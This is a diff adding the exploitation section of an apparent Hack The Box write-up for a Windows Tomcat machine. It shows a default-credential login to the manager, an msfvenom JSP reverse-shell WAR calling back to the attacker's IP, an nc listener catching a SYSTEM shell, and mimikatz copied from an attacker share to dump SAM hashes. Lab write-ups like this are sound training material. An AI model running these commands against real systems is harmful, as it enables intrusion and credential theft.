@@ -65,4 +65,55 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2020/12/28 14:01:45 Finished
 ===============================================================
 ```
+Among the exposed directories is the manager page, but it needs a login. By trying the default credentials for Tomcat, I can get logged in with `tomcat:s3cret`.
 
+### 3. Get a system shell
+Through the manager panel I can deploy web applications by uploading a war file. Generate an app to give me a reverse shell:
+```bash
+─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~]
+└──╼ [★]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.162 LPORT=9999 -f war > webshell.war
+Payload size: 1090 bytes
+Final size of war file: 1090 bytes
+```
+Then upload the war file via the admin panel. It is automatically deployed to /webshell.
+Access the app to trigger the shell.
+```bash
+─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~]
+└──╼ [★]$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.162] from (UNKNOWN) [10.129.1.110] 49192
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88>whoami
+nt authority\system
+
+C:\apache-tomcat-7.0.88>copy \\10.10.14.162\jack\mimikatz.exe .\meow.exe
+        1 file(s) copied.
+
+C:\apache-tomcat-7.0.88>.\meow.exe "lsadump::sam" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::sam
+Domain : JERRY
+SysKey : 777873202c520da6e5ce6f10e419892b
+Local SID : S-1-5-21-2323042369-1334567395-6350930
+
+SAMKey : f9949362f1f1bada77d23e7d6370d3d6
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: fe34b627386c89a49eb254f6a267e4d9
+
+RID  : 000001f5 (501)
+User : Guest
+
+mimikatz(commandline) # exit
+Bye!
+```
